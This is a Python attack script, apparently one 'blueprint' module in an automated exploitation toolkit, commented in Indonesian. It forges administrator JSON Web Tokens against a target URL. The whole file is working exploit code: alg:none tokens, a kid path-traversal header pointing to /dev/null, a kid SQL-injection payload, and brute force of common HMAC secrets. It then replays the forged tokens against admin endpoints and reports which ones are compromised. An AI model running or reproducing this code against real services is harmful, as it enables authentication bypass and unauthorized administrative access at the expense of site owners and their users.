"""
Ouroboros Code Blueprint: JWT Forgery Attacks
=============================================
Kategori : JWT (JSON Web Token) Forgery & Bypass
Tingkat  : Advanced
Teknik   : alg:none bypass, weak secret crack, kid injection, algorithm confusion
"""

def run_exploit(target_url):
    """
    Blueprint untuk menyerang endpoint yang menggunakan JWT.
    Percobaan urutan: alg:none → kid traversal → kid SQLi → algorithm confusion.
    """
    import requests
    import base64
    import json
    import hmac
    import hashlib

    session = requests.Session()

    # --- Utility: Encode JWT tanpa library external ---
    def b64url_encode(data):
        if isinstance(data, str):
            data = data.encode()
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

    def b64url_decode(data):
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data)

    def forge_jwt_none(payload_dict):
        """Teknik 1: alg:none bypass"""
        header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}))
        payload = b64url_encode(json.dumps(payload_dict))
        return f"{header}.{payload}."

    def forge_jwt_hs256(header_dict, payload_dict, secret):
        """Forge JWT dengan HMAC-SHA256"""
        header = b64url_encode(json.dumps(header_dict))
        payload = b64url_encode(json.dumps(payload_dict))
        msg = f"{header}.{payload}".encode()
        if isinstance(secret, str):
            secret = secret.encode()
        sig = hmac.new(secret, msg, hashlib.sha256).digest()
        return f"{header}.{payload}.{b64url_encode(sig)}"

    def get_existing_jwt(endpoint):
        """Ambil token valid dari login normal untuk dianalisis"""
        try:
            r = session.post(f"{target_url}/login",
                            json={"username": "guest", "password": "guest"},
                            timeout=5)
            data = r.json()
            return data.get("token") or data.get("access_token") or data.get("jwt")
        except Exception:
            return None

    # Payload admin yang ingin kita forge
    admin_payload = {"sub": "admin", "role": "administrator", "iat": 9999999999}

    # Endpoint yang perlu token
    protected_endpoints = [
        f"{target_url}/api/admin",
        f"{target_url}/api/users",
        f"{target_url}/dashboard",
        f"{target_url}/profile",
    ]

    results = []

    try:
        # ---- Teknik 1: alg:none bypass ----
        for variant in [
            forge_jwt_none(admin_payload),
            # Variasi case
            b64url_encode('{"alg":"None","typ":"JWT"}') + "." +
            b64url_encode(json.dumps(admin_payload)) + ".",
            b64url_encode('{"alg":"NONE","typ":"JWT"}') + "." +
            b64url_encode(json.dumps(admin_payload)) + ".",
        ]:
            for ep in protected_endpoints:
                r = session.get(ep, headers={"Authorization": f"Bearer {variant}"}, timeout=5)
                if r.status_code == 200 and any(
                    kw in r.text.lower() for kw in ["admin", "dashboard", "user_list", "success"]
                ):
                    return {"status": "COMPROMISED", "details": f"JWT alg:none bypass berhasil di {ep}! Token: {variant[:50]}..."}

        # ---- Teknik 2: kid Path Traversal ke /dev/null ----
        kid_header = {"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"}
        token_kid = forge_jwt_hs256(kid_header, admin_payload, "")
        for ep in protected_endpoints:
            r = session.get(ep, headers={"Authorization": f"Bearer {token_kid}"}, timeout=5)
            if r.status_code == 200:
                return {"status": "COMPROMISED", "details": f"JWT kid:/dev/null bypass berhasil di {ep}!"}

        # ---- Teknik 3: kid SQL Injection ----
        sqli_kid = "1' UNION SELECT 'ouroboros_secret'-- -"
        kid_sql_header = {"alg": "HS256", "typ": "JWT", "kid": sqli_kid}
        token_sqli = forge_jwt_hs256(kid_sql_header, admin_payload, "ouroboros_secret")
        for ep in protected_endpoints:
            r = session.get(ep, headers={"Authorization": f"Bearer {token_sqli}"}, timeout=5)
            if r.status_code == 200:
                return {"status": "COMPROMISED", "details": f"JWT kid SQL Injection bypass berhasil di {ep}!"}

        # ---- Teknik 4: Weak Secret Brute Force ----
        common_secrets = [
            "secret", "password", "key", "jwt_secret", "changeme",
            "123456", "admin", "token", "your-256-bit-secret", "supersecret",
            "app_secret", "mysecret", "private"
        ]
        existing_jwt = get_existing_jwt(f"{target_url}/login")
        if existing_jwt:
            parts = existing_jwt.split(".")
            if len(parts) == 3:
                original_header = json.loads(b64url_decode(parts[0]))
                original_payload = json.loads(b64url_decode(parts[1]))
                for secret in common_secrets:
                    # Verifikasi secret dengan re-signing
                    msg = f"{parts[0]}.{parts[1]}".encode()
                    expected_sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
                    if b64url_encode(expected_sig) == parts[2]:
                        # Secret ditemukan! Forge token admin
                        forged = forge_jwt_hs256(original_header, admin_payload, secret)
                        for ep in protected_endpoints:
                            r = session.get(ep, headers={"Authorization": f"Bearer {forged}"}, timeout=5)
                            if r.status_code == 200:
                                return {"status": "COMPROMISED",
                                        "details": f"JWT weak secret '{secret}' ditemukan! Forged admin token berhasil di {ep}!"}

        return {"status": "FAILED", "details": "Semua teknik JWT bypass gagal. Target kemungkinan menggunakan konfigurasi JWT yang kuat."}

    except Exception as e:
        return {"status": "FAILED", "details": f"Exception: {str(e)}"}
